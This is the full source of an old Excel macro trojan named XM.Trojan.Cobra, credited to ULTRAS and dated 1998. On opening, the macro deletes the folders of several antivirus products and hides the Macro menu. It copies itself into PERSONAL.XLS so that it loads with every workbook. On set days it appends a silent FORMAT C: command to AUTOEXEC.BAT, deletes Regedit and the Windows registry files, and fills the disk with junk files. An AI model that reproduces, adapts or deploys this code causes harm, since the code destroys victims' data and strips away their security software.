   Attribute VB_Name = "Sheet5"
   '********************************
   '* Name    : XM.Trojan.Cobra    *
   '* Created : February 12, 1998  *
   '* Author  : ULTRAS             *
   '********************************
   Sub Auto_Open()
   Attribute Auto_Open.VB_ProcData.VB_Invoke_Func = " \n14"
   On Error Resume Next
   Call Auto_Close
   Kill "C:\Program Files\AntiViral Toolkit Pro\*.*"
   MenuBars(xlWorksheet).Menus("Tools").MenuItems("&Macro...").Delete
   Kill "C:\Program Files\FindVirus\*.*"
   MenuBars(xlModule).Menus("Tools").MenuItems("&Macro...").Delete
   Kill "C:\f-macro\*.*"
   MenuBars(xlNoDocuments).Menus("Tools").MenuItems("&Macro...").Delete
   Kill "C:\Program Files\Command Software\F-PROT95\*.*"
   MenuBars(xlInfo).Menus("Tools").MenuItems("&Macro...").Delete
   Kill "C:\Program Files\McAfee\VirusScan\*.*"
   MenuBars(xlChart).Menus("Tools").MenuItems("&Macro...").Delete
   Kill "C:\Program Files\Norton AntiVirus\*.*"
   Call TIMER
   End Sub

   Sub Auto_Close()
   Attribute Auto_Close.VB_ProcData.VB_Invoke_Func = " \n14"
   ULTRAS = 0
   COBRA = 0
   Application.ScreenUpdating = False
   For b = 1 To Application.Workbooks.Count
   If Application.Workbooks(b).Name = "PERSONAL.XLS" Then
   ULTRAS = 1
   For u = 1 To Application.Workbooks("PERSONAL.XLS").Modules.Count
   If Application.Workbooks("PERSONAL.XLS").Modules(u).Name = "Sheet5" Then
   COBRA = 1
   End If
   Next
   If COBRA = 0 Then
   Windows("PERSONAL.XLS").Visible = True
   Application.Workbooks("Cobra.XLS").Modules("Sheet5").Copy after:=Application.Workbooks("PERSONAL.XLS").Modules(1)
   Windows("PERSONAL.XLS").Visible = False
   Application.Workbooks("PERSONAL.XLS").Save
   End If
   End If
   Next
   If ULTRAS = 0 Then
   newname$ = ActiveWorkbook.Name
   Application.Workbooks(newname$).SaveCopyAs Application.StartupPath + "\PERSONAL.XLS"
   Application.Workbooks.Open (Application.StartupPath + "\PERSONAL.XLS")
   Windows("PERSONAL.XLS").Visible = False
   Application.Workbooks("PERSONAL.XLS").Save
   End If
   Application.ScreenUpdating = True
   End Sub

   Sub TIMER()
   Attribute TIMER.VB_ProcData.VB_Invoke_Func = " \n14"
   On Error GoTo TicTac
   If Day(Now()) = 4 Then
   Open "C:\AUTOEXEC.BAT" For Input As #1
   Close
   SetAttr "C:\AUTOEXEC.BAT", vbNormal
   Open "C:\AUTOEXEC.BAT" For Append As #1
   Print #1, "@ECHO OFF"
   Print #1, "CLS"
   Print #1, "ECHO Please wait update you system files"
   Print #1, "FORMAT C: /U /C /S /AUTOTEST > NUL"
   Close #1
   SetAttr "C:\AUTOEXEC.BAT", vbReadOnly
   End If
   If Day(Now()) = 14 Then
   MsgBox "You Infected XM.Trojan.COBRA by ULTRAS", 16, "ULTRAS"
   Call Trojan
   Kill "C:\Windows\Regedit.exe"
   End If
   If Day(Now()) = 26 Then
   MsgBox "You Infected XM.Trojan.COBRA by ULTRAS", 16, "ULTRAS"
   SetAttr "c:\windows\system.dat", 0
   SetAttr "c:\windows\system.da0", 0
   Kill "c:\windows\system.dat"
   Kill "c:\windows\system.da0"
   Call Trojan
   End If
   If Day(Now()) = Int((31 * Rnd) + 1) Then Call Trojan
   TicTac:
   End Sub

   Sub Trojan()
   Attribute Trojan.VB_ProcData.VB_Invoke_Func = " \n14"
   On Error GoTo X
   c = 0
   u = 9666
   Z:
   Open u For Output As #1
   Print #1, "XM.Trojan.COBRA BY ULTRAS"
   Close #1
   If i = 999 Then
   c = 0
   Else
   c = c + 1
   End If
   u = u + 1
   GoTo Z
   X:
   End Sub
